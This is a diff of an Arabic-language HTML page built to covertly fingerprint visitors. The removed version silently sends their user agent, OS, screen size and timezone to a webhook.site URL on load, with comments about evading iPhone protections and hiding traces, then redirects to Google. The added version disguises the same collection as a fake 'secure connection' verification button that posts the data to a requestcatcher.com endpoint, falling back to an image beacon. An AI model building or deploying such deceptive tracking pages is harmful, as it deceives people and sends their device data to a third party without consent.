@@ -2,18 +2,30 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>تأمين الاتصال</title>
     <style>
-        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f2f2f2; font-family: system-ui; }
+        .card { background: white; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        h2 { margin: 10px 0; color: #333; }
+        p { color: #777; font-size: 14px; margin-bottom: 20px; }
+        .btn { background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn.green { background: #28a745; }
+        .status { margin-top: 10px; color: #28a745; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
-    
-    <script>
-        // النسخة النهائية - إرسال عبر Fetch للجوال
+    <div class="card" id="card">
+        <h2>🔐 تأمين الاتصال</h2>
+        <p>عليك الضغط على الزر لإكمال التحقق</p>
+        <button class="btn" id="sendBtn">تحقق الآن</button>
+        <div class="status" id="status">✅ تم</div>
+    </div>
 
-        // 1. دالة جمع البيانات
-        function collectData() {
+    <script>
+        document.getElementById('sendBtn').addEventListener('click', function() {
+            const btn = this;
+            const status = document.getElementById('status');
+
             const ua = navigator.userAgent;
             let os = "Unknown";
             if (ua.includes('Windows')) os = "Windows";
@@ -21,48 +33,35 @@
             else if (ua.includes('iPhone')) os = "iOS";
             else if (ua.includes('Android')) os = "Android";
 
-            return {
+            const data = {
                 ua: ua,
                 os: os,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timestamp: new Date().toISOString()
             };
-        }
 
-        // 2. دالة الإرسال (تجاوز حماية آيفون)
-        function sendData() {
-            const data = collectData();
-            
             // ================================================
-            //  الرابط الخاص بك
+            // الرابط الخاص بك (من RequestCatcher)
             // ================================================
-            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
+            const webhook = 'https://bhaith.requestcatcher.com';
 
-            // إرسال البيانات كـ JSON Body عبر طلب POST (يتجاوز حماية قطع الروابط)
             fetch(webhook, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data),
-                mode: 'no-cors' // يمنع المتصفح من إظهار أخطاء الحماية
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                btn.classList.add('green');
+                btn.innerText = "تم التحقق";
+                status.style.display = "block";
             }).catch(() => {
-                // إذا فشل الـ fetch، استخدم الـ sendBeacon (طريقة أخرى آمنة للجوال)
-                navigator.sendBeacon(webhook, JSON.stringify(data));
+                const qs = new URLSearchParams(data).toString();
+                new Image().src = `${webhook}?${qs}`;
+                btn.classList.add('green');
+                btn.innerText = "تم التحقق";
+                status.style.display = "block";
             });
-        }
-
-        // 3. تشغيل الكود وإخفاء الأثر
-        window.onload = function() {
-            // إرسال البيانات
-            sendData();
-
-            // بعد ثانية، التحويل إلى جوجل
-            setTimeout(function() {
-                window.location.replace("https://www.google.com");
-            }, 1000);
-        };
+        });
     </script>
 </body>
 </html>
